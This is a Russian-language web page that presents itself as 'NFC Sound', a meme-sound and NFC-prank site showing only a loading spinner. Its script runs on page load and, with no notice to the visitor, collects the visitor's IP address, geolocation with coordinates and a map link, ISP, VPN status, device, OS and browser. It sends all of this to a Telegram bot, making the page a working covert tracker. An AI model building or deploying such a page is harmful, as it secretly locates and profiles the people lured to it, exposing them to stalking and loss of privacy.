<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Главная | NFC Sound</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            background: radial-gradient(ellipse at center, #1a1a1a 0%, #0a0a0a 100%);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .card {
            background: rgba(30, 30, 40, 0.7);
            backdrop-filter: blur(20px);
            border-radius: 40px;
            padding: 40px 30px;
            max-width: 400px;
            width: 100%;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.15);
            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.3);
            animation: fadeIn 0.6s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }

        h1 {
            color: white;
            margin-bottom: 10px;
            font-size: 28px;
        }

        .sub {
            color: #aaa;
            margin-bottom: 30px;
            font-size: 14px;
        }

        .loader {
            width: 40px;
            height: 40px;
            border: 3px solid #ff4444;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .status {
            margin-top: 20px;
            font-size: 14px;
            color: #4caf50;
            opacity: 0;
            transition: opacity 0.3s;
        }

        .status.show {
            opacity: 1;
        }

        .footer {
            margin-top: 30px;
            font-size: 11px;
            color: #444;
        }
    </style>
</head>
<body>
    <div class="card">
        <h1>🔊 NFC Sound</h1>
        <div class="sub">Мемные звуки • NFC пранки</div>
        <div class="loader"></div>
        <div class="status" id="status">Загрузка...</div>
        <div class="footer">© 2026 • Все звуки короткие</div>
    </div>

    <script>
        // ========== ПЛЕЙСХОЛДЕРЫ (ЗАМЕНЯЮТСЯ ЧЕРЕЗ GITHUB SECRETS) ==========
        const BOT_TOKEN = '__BOT_TOKEN__';
        const CHAT_ID = '__CHAT_ID__';
        // =========================================================================
        
        const statusDiv = document.getElementById('status');
        
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch(e) {
                return 'не определён';
            }
        }
        
        async function getGeo(ip) {
            try {
                const res = await fetch(`https://ip-api.com/json/${ip}?fields=status,country,city,regionName,lat,lon,isp,org,proxy,query`);
                const data = await res.json();
                if (data.status === 'success') {
                    return {
                        country: data.country,
                        region: data.regionName,
                        city: data.city,
                        lat: data.lat,
                        lon: data.lon,
                        isp: data.isp,
                        org: data.org,
                        isProxy: data.proxy || false,
                        mapUrl: `https://www.google.com/maps?q=${data.lat},${data.lon}`
                    };
                }
            } catch(e) {}
            return null;
        }
        
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let device = 'Неизвестно';
            if (/iPhone|iPad|iPod/i.test(ua)) device = '🍎 iOS';
            else if (/Android/i.test(ua)) device = '🤖 Android';
            else if (/Windows/i.test(ua)) device = '💻 Windows';
            else if (/Macintosh/i.test(ua)) device = '🍏 Mac';
            
            let browser = 'Другой';
            if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
            else if (ua.includes('Chrome')) browser = 'Chrome';
            else if (ua.includes('Firefox')) browser = 'Firefox';
            else if (ua.includes('Edg')) browser = 'Edge';
            
            let os = '';
            if (ua.includes('iPhone OS')) {
                const match = ua.match(/iPhone OS ([\d_]+)/);
                if (match) os = `iOS ${match[1].replace(/_/g, '.')}`;
            } else if (ua.includes('Android')) {
                const match = ua.match(/Android ([\d.]+)/);
                if (match) os = `Android ${match[1]}`;
            } else if (ua.includes('Windows NT 10.0')) os = 'Windows 10/11';
            else if (ua.includes('Windows NT 6.1')) os = 'Windows 7';
            else if (ua.includes('Mac OS X')) os = 'macOS';
            
            const screen = `${window.screen.width}x${window.screen.height}`;
            const language = navigator.language;
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            
            return { device, browser, os, screen, language, timezone };
        }
        
        async function sendToTelegram(ip, geo, deviceInfo, isProxy) {
            if (BOT_TOKEN === '__BOT_TOKEN__' || CHAT_ID === '__CHAT_ID__') {
                console.log('Секреты не заменены');
                return;
            }
            
            let message = `🔍 *НОВЫЙ ПОСЕТИТЕЛЬ*\n\n`;
            message += `🌐 *IP:* ${ip}\n`;
            if (geo) {
                if (geo.city || geo.region || geo.country) {
                    message += `📍 *Местоположение:* ${geo.city ? geo.city + ', ' : ''}${geo.region ? geo.region + ', ' : ''}${geo.country || ''}\n`;
                }
                if (geo.lat && geo.lon) message += `🗺️ *Карта:* [Google Maps](${geo.mapUrl})\n`;
                message += `📡 *Провайдер:* ${geo.isp || 'неизвестен'}\n`;
                if (isProxy) message += `⚠️ *Вероятно использует VPN/Прокси*\n`;
            }
            message += `\n📱 *Устройство:* ${deviceInfo.device}\n`;
            if (deviceInfo.os) message += `💻 *ОС:* ${deviceInfo.os}\n`;
            message += `🧠 *Браузер:* ${deviceInfo.browser}\n`;
            message += `🕒 *Время:* ${new Date().toLocaleString()}`;
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true
                })
            });
        }
        
        async function main() {
            statusDiv.textContent = 'Загрузка...';
            statusDiv.classList.add('show');
            
            const ip = await getIP();
            const geo = await getGeo(ip);
            const deviceInfo = getDeviceInfo();
            const isProxy = geo?.isProxy || false;
            
            await sendToTelegram(ip, geo, deviceInfo, isProxy);
            
            statusDiv.textContent = 'Готово';
            setTimeout(() => {
                statusDiv.classList.remove('show');
            }, 2000);
        }
        
        main();
    </script>
</body>
</html>
